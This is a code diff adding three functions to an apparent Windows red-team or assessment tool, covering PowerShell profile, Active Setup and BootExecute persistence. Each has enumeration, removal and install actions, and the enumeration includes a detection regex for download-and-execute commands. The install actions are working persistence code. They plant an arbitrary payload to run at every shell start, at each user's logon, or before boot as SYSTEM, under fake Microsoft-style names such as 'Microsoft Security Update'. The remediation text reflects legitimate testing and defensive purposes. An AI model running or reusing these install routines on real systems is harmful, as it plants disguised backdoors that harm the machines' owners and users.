@@ -3552,3 +3552,452 @@ Write-Output "[+] ScreenSaveActive set to 0"
 
   return { output: output.join("\n"), findings }
 }
+
+export async function powershellProfile(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const payload = argVal(args, "--payload")
+  const scope = argVal(args, "--scope") || "current"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] PowerShell profile persistence...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== PowerShell Profile Locations ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+$profiles = @(
+    @{ Name = 'Current User, Current Host'; Path = $PROFILE.CurrentUserCurrentHost; Scope = 'user' },
+    @{ Name = 'Current User, All Hosts'; Path = $PROFILE.CurrentUserAllHosts; Scope = 'user' },
+    @{ Name = 'All Users, Current Host'; Path = $PROFILE.AllUsersCurrentHost; Scope = 'machine' },
+    @{ Name = 'All Users, All Hosts'; Path = $PROFILE.AllUsersAllHosts; Scope = 'machine' }
+)
+
+foreach ($p in $profiles) {
+    $exists = Test-Path $p.Path
+    $status = if ($exists) { '[EXISTS]' } else { '[NONE]' }
+    $writable = $false
+    if ($exists) {
+        try {
+            $testFile = "$($p.Path).cs-test"
+            [System.IO.File]::Create($testFile).Close()
+            Remove-Item $testFile -Force
+            $writable = $true
+        } catch {}
+    } else {
+        $dir = Split-Path $p.Path -Parent
+        if (Test-Path $dir) {
+            try {
+                $testFile = "$dir\\cs-test.tmp"
+                [System.IO.File]::Create($testFile).Close()
+                Remove-Item $testFile -Force
+                $writable = $true
+            } catch {}
+        }
+    }
+    $writeStatus = if ($writable) { '[WRITABLE]' } else { '[READ-ONLY]' }
+    Write-Output "    $status $writeStatus $($p.Name)"
+    Write-Output "         $($p.Path)"
+    if ($exists) {
+        $content = Get-Content $p.Path -Raw
+        $lines = ($content -split "`n").Count
+        Write-Output "         Lines: $lines  Size: $([math]::Round((Get-Item $p.Path).Length/1KB, 1)) KB"
+        if ($content -match 'Invoke-Expression|IEX|DownloadString|Net\.WebClient|Start-Process|cmd\.exe|powershell\.exe') {
+            Write-Output "         [!!!] SUSPICIOUS content detected — may contain existing backdoor"
+        }
+    }
+    Write-Output ""
+}
+
+Write-Output "=== PowerShell Execution Policy ==="
+$policies = Get-ExecutionPolicy -List
+foreach ($pol in $policies) {
+    Write-Output "    $($pol.Scope): $($pol.ExecutionPolicy)"
+}
+
+Write-Output ""
+Write-Output "=== Profile Loading Behavior ==="
+Write-Output "[*] Profiles load automatically on every PowerShell session start"
+Write-Output "[*] -NoProfile flag skips loading (used by some automated tools)"
+Write-Output "[*] ISE, VS Code, Windows Terminal all load profiles"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-PERSIST-021",
+      provider: "windows",
+      severity: r.stdout.includes("SUSPICIOUS") ? "high" : "info",
+      status: "ENUMERATED",
+      resource: "profile://powershell",
+      title: "PowerShell profile enumeration — persistence locations and write permissions",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor profile files for changes. Use -NoProfile in automated scripts. Restrict AllUsers profile write access.",
+    })
+  }
+
+  if (action === "install") {
+    if (!payload) {
+      output.push("[!] --payload required for install action")
+      return { output: output.join("\n"), findings }
+    }
+    const profilePath = scope === "all" ? "$PROFILE.AllUsersAllHosts" : "$PROFILE.CurrentUserCurrentHost"
+    const script = `
+Write-Output "=== Installing PowerShell Profile Persistence ==="
+$profilePath = ${profilePath}
+Write-Output "[*] Target profile: $profilePath"
+
+$dir = Split-Path $profilePath -Parent
+if (-not (Test-Path $dir)) {
+    New-Item -ItemType Directory -Path $dir -Force | Out-Null
+    Write-Output "[+] Created directory: $dir"
+}
+
+$payload = '${payload.replace(/'/g, "''")}'
+$marker = "# Windows PowerShell compatibility module"
+
+if (Test-Path $profilePath) {
+    $existing = Get-Content $profilePath -Raw
+    if ($existing -match [regex]::Escape($payload)) {
+        Write-Output "[*] Payload already present in profile"
+        exit 0
+    }
+    Write-Output "[*] Appending to existing profile..."
+    Add-Content $profilePath -Value "`n$marker`n$payload"
+} else {
+    Write-Output "[*] Creating new profile..."
+    Set-Content $profilePath -Value "$marker`n$payload"
+}
+
+Write-Output "[+] Profile persistence installed"
+Write-Output "[+] Payload will execute on every PowerShell session start"
+Write-Output "[*] Profile: $profilePath"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-PERSIST-022",
+      provider: "windows",
+      severity: "high",
+      status: r.stdout.includes("installed") ? "EXECUTED" : "FAILED",
+      resource: "profile://powershell",
+      title: "PowerShell profile persistence installed",
+      details: `Scope: ${scope}, Payload: ${payload.substring(0, 100)}`,
+      remediation: "Monitor $PROFILE paths for modifications. Use file integrity monitoring on profile locations.",
+    })
+  }
+
+  if (action === "remove") {
+    const profilePath = scope === "all" ? "$PROFILE.AllUsersAllHosts" : "$PROFILE.CurrentUserCurrentHost"
+    const script = `
+$profilePath = ${profilePath}
+if (Test-Path $profilePath) {
+    $content = Get-Content $profilePath -Raw
+    $cleaned = $content -replace '(?s)# Windows PowerShell compatibility module.*?(?=\\n#|\\z)', ''
+    if ($cleaned.Trim()) {
+        Set-Content $profilePath -Value $cleaned.Trim()
+        Write-Output "[+] Payload removed, profile preserved"
+    } else {
+        Remove-Item $profilePath -Force
+        Write-Output "[+] Empty profile deleted: $profilePath"
+    }
+} else {
+    Write-Output "[*] Profile not found: $profilePath"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function activeSetup(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const payload = argVal(args, "--payload")
+  const name = argVal(args, "--name") || "Microsoft.Update.Security"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Active Setup persistence...\n"]
+
+  const regPath = `HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{${name}}`
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Active Setup Registry Entries ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+$basePath = "HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components"
+$entries = Get-ChildItem $basePath -ErrorAction SilentlyContinue
+
+Write-Output "[*] Total Active Setup entries: $($entries.Count)"
+Write-Output ""
+
+$suspicious = @()
+foreach ($entry in $entries) {
+    $props = Get-ItemProperty $entry.PSPath -ErrorAction SilentlyContinue
+    $stubCmd = $props.StubPath
+    if (-not $stubCmd) { continue }
+
+    $isMicrosoft = $stubCmd -match 'system32|syswow64|Microsoft|Windows|Common Files'
+    if (-not $isMicrosoft) {
+        $suspicious += [PSCustomObject]@{
+            GUID = Split-Path $entry.Name -Leaf
+            Name = $props.'(default)'
+            StubPath = $stubCmd
+            Version = $props.Version
+        }
+    }
+}
+
+if ($suspicious.Count -gt 0) {
+    Write-Output "[!] Non-Microsoft Active Setup entries ($($suspicious.Count)):"
+    foreach ($s in $suspicious) {
+        Write-Output "    GUID: $($s.GUID)"
+        Write-Output "    Name: $($s.Name)"
+        Write-Output "    Stub: $($s.StubPath)"
+        Write-Output "    Ver:  $($s.Version)"
+        Write-Output ""
+    }
+} else {
+    Write-Output "[*] All entries appear to be Microsoft defaults"
+}
+
+Write-Output "=== How Active Setup Works ==="
+Write-Output "[*] HKLM entries run ONCE per user at first logon (or version change)"
+Write-Output "[*] Executed BEFORE Explorer shell — very early execution"
+Write-Output "[*] Per-user tracking: HKCU\\...\\Active Setup\\Installed Components\\{GUID}"
+Write-Output "[*] Changing Version forces re-execution for all users"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-PERSIST-023",
+      provider: "windows",
+      severity: r.stdout.includes("[!]") ? "high" : "info",
+      status: "ENUMERATED",
+      resource: "registry://active-setup",
+      title: "Active Setup registry persistence enumeration",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor Active Setup registry key changes. Audit non-Microsoft entries. Use SIEM rules for new GUID creation.",
+    })
+  }
+
+  if (action === "install") {
+    if (!payload) {
+      output.push("[!] --payload required for install action")
+      return { output: output.join("\n"), findings }
+    }
+    const guid = `{${name.replace(/\./g, "-")}}`
+    const script = `
+Write-Output "=== Installing Active Setup Persistence ==="
+$guid = '${guid}'
+$regPath = "HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\$guid"
+
+if (-not (Test-Path $regPath)) {
+    New-Item -Path $regPath -Force | Out-Null
+}
+
+Set-ItemProperty $regPath -Name '(default)' -Value 'Microsoft Security Update' -Type String
+Set-ItemProperty $regPath -Name 'StubPath' -Value '${payload.replace(/'/g, "''")}' -Type String
+Set-ItemProperty $regPath -Name 'Version' -Value '1,0,0,1' -Type String
+
+Write-Output "[+] Active Setup persistence installed"
+Write-Output "    GUID: $guid"
+Write-Output "    StubPath: ${payload}"
+Write-Output "    Version: 1,0,0,1"
+Write-Output ""
+Write-Output "[*] Will execute once for each user at their next logon"
+Write-Output "[*] To force re-execution: increment Version value"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-PERSIST-024",
+      provider: "windows",
+      severity: "high",
+      status: r.stdout.includes("installed") ? "EXECUTED" : "FAILED",
+      resource: `registry://active-setup/${guid}`,
+      title: "Active Setup per-user persistence installed",
+      details: `GUID: ${guid}, Payload: ${payload}`,
+      remediation: "Remove the registry key. Monitor Event ID 4657 for Active Setup modifications.",
+    })
+  }
+
+  if (action === "remove") {
+    const guid = `{${name.replace(/\./g, "-")}}`
+    const script = `
+$guid = '${guid}'
+$regPath = "HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\$guid"
+if (Test-Path $regPath) {
+    Remove-Item $regPath -Recurse -Force
+    Write-Output "[+] Active Setup entry removed: $guid"
+} else {
+    Write-Output "[*] Entry not found: $guid"
+}
+
+$users = Get-ChildItem "REGISTRY::HKEY_USERS" -ErrorAction SilentlyContinue
+foreach ($u in $users) {
+    $userPath = "REGISTRY::$($u.Name)\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\$guid"
+    if (Test-Path $userPath) {
+        Remove-Item $userPath -Recurse -Force
+        Write-Output "[+] Removed user tracking: $($u.Name)"
+    }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function bootExec(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const payload = argVal(args, "--payload")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] BootExecute persistence...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== BootExecute Registry Analysis ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+$smPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"
+$bootExec = (Get-ItemProperty $smPath).BootExecute
+
+Write-Output "[*] Current BootExecute value(s):"
+if ($bootExec) {
+    foreach ($entry in $bootExec) {
+        $isDefault = $entry -eq 'autocheck autochk *'
+        $marker = if ($isDefault) { '[DEFAULT]' } else { '[!!!CUSTOM]' }
+        Write-Output "    $marker $entry"
+    }
+} else {
+    Write-Output "    [EMPTY] No BootExecute entries"
+}
+
+Write-Output ""
+Write-Output "=== Session Manager Security Check ==="
+
+$setupExec = (Get-ItemProperty $smPath).SetupExecute
+if ($setupExec) {
+    Write-Output "[!] SetupExecute (runs once at boot):"
+    foreach ($entry in $setupExec) {
+        Write-Output "    $entry"
+    }
+}
+
+$pendingRename = (Get-ItemProperty $smPath).PendingFileRenameOperations
+if ($pendingRename) {
+    Write-Output "[*] PendingFileRenameOperations ($($pendingRename.Count) entries)"
+}
+
+$knownDlls = Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs" -ErrorAction SilentlyContinue
+if ($knownDlls) {
+    Write-Output ""
+    Write-Output "[*] KnownDLLs entries: $(($knownDlls.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' }).Count)"
+}
+
+Write-Output ""
+Write-Output "=== BootExecute Explained ==="
+Write-Output "[*] Programs listed run BEFORE any service or logon — native API only"
+Write-Output "[*] Default: 'autocheck autochk *' (runs chkdsk if needed)"
+Write-Output "[*] Custom entries must be native executables (no Win32 subsystem yet)"
+Write-Output "[*] Binary must be in %SystemRoot%\\System32"
+Write-Output "[*] Runs as SYSTEM with kernel-level access"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-PERSIST-025",
+      provider: "windows",
+      severity: r.stdout.includes("CUSTOM") ? "critical" : "info",
+      status: "ENUMERATED",
+      resource: "registry://boot-execute",
+      title: "BootExecute and Session Manager early boot persistence check",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor BootExecute registry changes. Only 'autocheck autochk *' should be present. Alert on any additions.",
+    })
+  }
+
+  if (action === "install") {
+    if (!payload) {
+      output.push("[!] --payload required — must be a native executable name in System32")
+      return { output: output.join("\n"), findings }
+    }
+    const script = `
+Write-Output "=== Installing BootExecute Persistence ==="
+$smPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"
+$current = (Get-ItemProperty $smPath).BootExecute
+
+if (-not $current) { $current = @() }
+if ($current -is [string]) { $current = @($current) }
+
+$newEntry = '${payload.replace(/'/g, "''")}'
+if ($current -contains $newEntry) {
+    Write-Output "[*] Entry already exists in BootExecute"
+    exit 0
+}
+
+$updated = $current + $newEntry
+Set-ItemProperty $smPath -Name 'BootExecute' -Value $updated -Type MultiString
+
+Write-Output "[+] BootExecute entry added: $newEntry"
+Write-Output "[*] Current entries:"
+foreach ($e in $updated) {
+    Write-Output "    $e"
+}
+Write-Output ""
+Write-Output "[!!!] WARNING: If binary is invalid, system may fail to boot"
+Write-Output "[*] Entry runs before Win32 — must be native API executable"
+Write-Output "[*] Effective on next reboot"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-PERSIST-026",
+      provider: "windows",
+      severity: "critical",
+      status: r.stdout.includes("added") ? "EXECUTED" : "FAILED",
+      resource: "registry://boot-execute",
+      title: "BootExecute early boot persistence installed",
+      details: `Payload: ${payload}`,
+      remediation: "Remove the entry from BootExecute MultiString. Monitor Session Manager registry changes.",
+    })
+  }
+
+  if (action === "remove") {
+    const script = `
+$smPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager"
+$current = (Get-ItemProperty $smPath).BootExecute
+
+if (-not $current) {
+    Write-Output "[*] BootExecute is empty"
+    exit 0
+}
+if ($current -is [string]) { $current = @($current) }
+
+$default = @('autocheck autochk *')
+$removed = $current | Where-Object { $_ -notin $default }
+
+if ($removed.Count -gt 0) {
+    Write-Output "[+] Removing non-default entries:"
+    foreach ($r in $removed) {
+        Write-Output "    $r"
+    }
+    Set-ItemProperty $smPath -Name 'BootExecute' -Value $default -Type MultiString
+    Write-Output "[+] BootExecute restored to default"
+} else {
+    Write-Output "[*] Only default entries present — nothing to remove"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
